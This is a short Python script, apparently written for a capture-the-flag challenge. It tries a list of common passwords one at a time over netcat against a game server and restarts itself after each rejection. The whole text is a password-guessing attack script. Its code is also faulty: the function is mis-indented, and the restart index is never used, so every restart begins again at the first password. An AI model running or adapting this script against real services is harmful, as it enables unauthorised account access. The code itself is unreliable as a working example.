import subprocess
import time
import sys

        def test_passwords():
    passwords = [
        "12345678", "password", "qwertyui", "87654321", "abcdefgh", "1234abcd", "iloveyou",
        "letmein1", "welcome1", "sunshine", "football", "monkey12", "dragon12", "trustno1",
        "superman", "princess", "baseball", "1q2w3e4r", "1234567a", "chocolate", "98765432"
        # Aggiungi altre password comuni
    ]
    
    for i, password in enumerate(passwords):
        while True:
            try:
                print(f"[*] Testing password: {password}")
                
                # Avvia netcat e passa la password
                process = subprocess.Popen(
                    ["nc", "nc.itscybergame.it", "15005"],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                
                # Invia la password
                process.stdin.write((password + "\n").encode())
                process.stdin.flush()
                
                # Legge la risposta
                output, error = process.communicate(timeout=5)
                response = output.decode()
                
                print("[+] Response:", response)
                if error:
                    print("[-] Error:", error.decode())
                
                # Se la connessione viene terminata con "Password errata", riavvia il programma e passa alla password successiva
                if "Password errata" in response:
                    print("[!] Password errata, riavviando il programma con la password successiva...")
                    time.sleep(1)
                    python = sys.executable
                    subprocess.Popen([python] + sys.argv + [str(i + 1)])  # Riavvia lo script con indice aggiornato
                    sys.exit()  # Termina l'istanza corrente
                else:
                    print("[+] Possibile successo!")
                    return
            except subprocess.TimeoutExpired:
                print("[-] Timeout, riprovando...")
                process.kill()
            except Exception as e:
                print(f"[-] Errore: {e}")
                break  # Evita loop infiniti in caso di errore grave
        
if __name__ == "__main__":
    import sys
    start_index = int(sys.argv[1]) if len(sys.argv) > 1 else 0  # Recupera l'indice se il programma viene riavviato
    test_passwords()